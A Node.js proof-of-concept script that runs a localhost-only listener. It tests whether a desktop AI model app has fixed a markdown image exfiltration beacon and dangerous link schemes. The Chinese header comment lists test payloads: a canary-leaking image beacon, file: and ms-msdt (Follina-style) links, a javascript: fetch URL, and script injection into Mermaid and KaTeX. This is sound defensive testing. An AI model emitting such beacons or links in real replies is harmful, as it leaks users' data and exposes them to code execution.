#!/usr/bin/env node
/*
 * 前端 XSS 专项 · 动态红队 PoC —— 本地外泄信标监听器（localhost only, 不做任何真实外泄）。
 *
 * 用途：手动验证「渲染侧外泄信标 (PI-001)」与「外链交付 (XSS-002)」两条链路的防御是否真的
 * 生效。它只在 127.0.0.1 上起一个 HTTP 监听，把任何打到它的请求打印出来——没有出网、不连任何
 * 真实攻击者服务器、不上报。停掉进程即彻底消失。
 *
 * 跑法：
 *   node apps/desktop/poc/xss-beacon-listener.mjs            # 默认 127.0.0.1:9099
 *   PORT=9100 node apps/desktop/poc/xss-beacon-listener.mjs  # 自定义端口
 *
 * 红队配方（在【已修】的桌面端里逐条试，预期都「打不中」本监听器 / 不弹危险动作）：
 *
 *   A. 渲染侧图片信标（PI-001）——让助手回复里出现下面这张「图片」：
 *        ![](http://127.0.0.1:9099/beacon?d=SECRET_canary)
 *      预期：渲染成一个「图片链接」文字而非 <img>，页面加载时【不】自动请求本监听器
 *      （控制台无 [BEACON HIT]）。只有用户主动点击该链接，才会走外链路径（见 B）。
 *
 *   B. 外链交付 / 危险 scheme（XSS-002）——让回复里出现这些链接并点击：
 *        [点我](http://127.0.0.1:9099/click?d=SECRET_canary)   → http: 放行，浏览器打开（会命中本监听器，属预期内的“用户显式点击”）
 *        [报告](file:///C:/Windows/System32/cmd.exe)            → file: 被拦，主进程日志打印 [security] blocked openExternal…
 *        [诊断](ms-msdt:/id PCWDiagnostic)                       → ms-msdt: 被拦（Follina 类）
 *        [x](javascript:fetch('http://127.0.0.1:9099/js'))      → 经 react-markdown 默认 urlTransform 置空，根本不可点
 *      预期：只有 http/https/mailto 能交给系统打开；file/ms-msdt/自定义 scheme 一律被拦 + 记日志。
 *
 *   C. 渲染 sink（mermaid / KaTeX）——贴入带 <script>/onerror 的 mermaid 或 KaTeX 源，
 *      预期：mermaid strict(DOMPurify) / KaTeX trust:false 不产出可执行标记，无脚本运行。
 *
 * 注：A 里「不命中」证明 PI-001 已断掉「无点击静默外泄」；B 里 file/ms-msdt「被拦」证明
 * XSS-002 白名单生效。命中本监听器的【只应是】你在 B 里【手动点击】的那条 http 链接。
 */

import { createServer } from "node:http";

const PORT = Number(process.env.PORT) || 9099;
const HOST = "127.0.0.1";

// 1x1 transparent GIF — so an <img>/beacon "succeeds" visually if anything DID load it.
const PIXEL = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64",
);

let hits = 0;
const server = createServer((req, res) => {
  hits += 1;
  const ts = new Date().toISOString();
  const ua = req.headers["user-agent"] ?? "-";
  const ref = req.headers.referer ?? req.headers.origin ?? "-";
  console.log(
    `\n[BEACON HIT #${hits}] ${ts}\n  ${req.method} ${req.url}\n  ua=${ua}\n  referer/origin=${ref}`,
  );
  console.log(
    "  ⚠️  如果这是 A 场景（图片信标）自动触发的，说明 PI-001 的图片降级失效了——请排查。",
  );
  res.writeHead(200, { "content-type": "image/gif", "cache-control": "no-store" });
  res.end(PIXEL);
});

server.listen(PORT, HOST, () => {
  console.log(`本地外泄信标监听器已启动：http://${HOST}:${PORT}/  (Ctrl+C 退出)`);
  console.log("等待请求中……（理想情况下只应看到你手动点击的 http 链接命中）");
});

server.on("error", (err) => {
  console.error(`监听器启动失败：${err.message}（端口被占用？换 PORT= 重试）`);
  process.exit(1);
});
